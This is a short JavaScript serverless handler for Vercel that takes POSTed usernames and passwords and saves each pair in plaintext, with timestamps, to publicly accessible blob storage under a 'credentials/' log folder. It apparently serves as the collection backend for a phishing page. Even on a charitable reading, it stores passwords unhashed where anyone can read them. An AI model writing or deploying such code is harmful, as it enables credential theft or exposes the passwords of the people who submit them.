import { put } from '@vercel/blob';

export default async function handler(req, res) {
  // Only allow POST requests
  if (req.method !== 'POST') {
    res.setHeader('Allow', ['POST']);
    return res.status(405).json({ error: `Method ${req.method} Not Allowed` });
  }

  try {
    if (!process.env.BLOB_READ_WRITE_TOKEN) {
      return res.status(500).json({
        error: 'Failed to write to Vercel Blob',
        details: 'BLOB_READ_WRITE_TOKEN is missing. Please ensure you have connected the Blob store to your Vercel project and redeployed the site.'
      });
    }

    const { username, password } = req.body;

    if (!username || !password) {
      return res.status(400).json({ error: 'Username and password are required' });
    }

    // Generate a unique filename under credentials/ directory
    const timestamp = Date.now();
    const dateStr = new Date().toISOString().replace(/[:.]/g, '-');
    const randomStr = Math.random().toString(36).substring(2, 8);
    const filename = `credentials/log_${dateStr}_${randomStr}.json`;

    // Format credentials payload
    const payload = JSON.stringify({
      username,
      password,
      timestamp,
      dateString: new Date().toLocaleString('en-US', { timeZone: 'Asia/Kolkata' })
    }, null, 2);

    // Save to Vercel Blob
    await put(filename, payload, {
      access: 'public',
      contentType: 'application/json',
    });

    return res.status(200).json({ success: true, message: 'Saved successfully to Vercel Blob' });
  } catch (error) {
    console.error('Error saving to Vercel Blob:', error);
    return res.status(500).json({ error: 'Failed to write to Vercel Blob', details: error.message });
  }
}
